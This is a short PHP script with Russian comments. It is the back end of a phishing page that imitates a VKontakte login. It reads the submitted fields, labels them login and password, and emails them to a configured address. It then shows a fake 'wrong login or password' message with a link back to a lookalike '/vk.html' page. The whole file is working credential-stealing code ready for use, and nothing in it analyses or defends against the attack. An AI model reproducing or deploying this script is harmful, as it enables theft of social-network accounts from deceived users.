<? 
// ----------------------------конфигурация-------------------------- // 
 
$adminemail="admin@mail.ru";  // e-mail админа 
 
 
$date=date("d.m.y"); // число.месяц.год 
 
$time=date("H:i"); // часы:минуты:секунды 
 
$backurl="vk.com";  // На какую страничку переходит после отправки письма 
 
//---------------------------------------------------------------------- // 
 
  
 
// Принимаем данные с формы 
 
$name=$_POST['name']; 
 
 
$msg=$_POST['message']; 
 
  
 
$msg=" 
 
 
Логин: $name
 
Пароль: $msg
 
 
"; 
 
  

 
 // Отправляем письмо админу  
 
mail("$adminemail", "$date $time Сообщение 
от $name", "$msg"); 
 
  
 
print "
<head><meta charset='utf-8'></head>
<body>
<div style='padding:10px; color:#000;font-size:20px; border-radius: 3px'>Неверный логин или пароль</div>
<br /><br />
<a href='/vk.html' style='padding:10px; color: #fff; background: #0000FF; font-size:15px; text-decoration: none;  border-radius: 3px'><b>Повторить попытку</b></a>
</body>";  
exit; 
 
?>